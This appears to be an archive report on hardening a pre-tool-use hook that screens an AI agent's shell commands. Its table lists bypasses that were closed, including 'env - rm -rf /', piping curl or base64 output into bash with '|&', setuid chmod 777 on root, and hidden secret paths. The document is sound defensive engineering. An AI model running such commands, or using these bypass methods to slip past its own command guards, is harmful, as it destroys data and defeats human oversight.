# Archive Report — skillguard-utility-parser-redesign

**Archived:** 2026-08-16
**Status:** COMPLETE — implemented, verified, merged.
**Amends:** `skillguard-pretooluse-hook` @ `69823570` (parent Slice-1 remains a separate, still-unarchived change).

## Summary

Replaced the three boolean utility helpers in the packaged Claude PreToolUse hook
(`assets/claude-hooks/javi-forge-skillguard-pre-tool-use.mjs`) with a bounded,
host-independent semantic parser: a frozen 7-entry GNU/Apple profile registry, an
`env -S` split-string machine (cumulative split-work bound + commandless terminal),
GNU default/POSIXLY_CORRECT + Apple `chmod` machines (mixed-mode-reference rejection),
GNU + Apple `base64` machines (real-pipeline shell sink), a danger-dominant profile
union, and a protected-sink ambiguity adapter (`utility-ambiguity`).

## Verification evidence

- `pnpm test` 2113 passed / 2 skipped · `pnpm validate` 0 · `pnpm package:check` 0 · coverage 90.52% lines / 82.36% branches.
- **Post-apply Judgment Day** (two blind judges, Opus): both prior CRITICAL findings
  `JD-S1-FR3-001` (env split-string sensitive-read hiding) and `JD-S1-FR3-002`
  (base64 decode-to-shell / chmod permutation) **CONFIRMED-CLOSED** with real
  subprocess exit-code evidence. Two-judge convergence satisfied adversarial
  verification; no refuters spawned.
- Windows host-independent lane (`claude-hook-windows.yml`) green on all merged units.

## Security bypasses closed during this change

| ID | Bypass | Fix |
|---|---|---|
| R1-001 | `env - rm -rf /` (GNU bare `-` ⇒ `-i`) allowed | env machine treats bare `-` as an option |
| R1-002 | `CHMOD`/`BASE64`/`ENV` uppercase allowed on case-insensitive FS | case-insensitive literal identity (design.md:340 amended) |
| — | `\??\`-prefixed secret path evaded detection on Windows | strip device aliases before native realpath |
| — | `CLAUDE.md` unprotected on macOS/Windows | case-fold managed-config literals on win32/darwin |
| JDB-001 | `base64 -d p \|& bash` / `curl x \|& bash` bypassed pipe-to-shell | `lex` tokenizes `\|&` as a real pipe |
| JDA-004 | `chmod 4777/1777 /` not flagged | `mode777` matches special-bit/zero-prefixed 777 |

## Merged units (PRs into `feat/skillguard-pretooluse-hook-01-runtime`)

- #49 semantic env/chmod/base64 machines · #52 drop dead boolean helpers (replaced auto-closed #50)
- #51 case-insensitive identity (R1-002) · #53 `|&` pipe + setuid mode-777 hardening
- Path/Windows hardening landed in the base branch (device-alias, CLAUDE.md case-fold, `.gitattributes` LF-pin).

## Spec sync

`specs/skillguard-utility-parser-redesign/spec.md` synced to
`openspec/specs/skillguard-utility-parser-redesign/spec.md` (new capability; plain
spec, no delta markers).

## Notes / follow-ups (see backlog)

- Parent change `skillguard-pretooluse-hook` (Slice-1) is now unblocked (Judgment Day
  passed) but remains **unarchived**; its capability spec is not yet in `openspec/specs/`.
- Parent review-ledger byte-identity gate (G.1 = `423eac0b`) was preserved as an
  uncommitted working-tree baseline throughout.
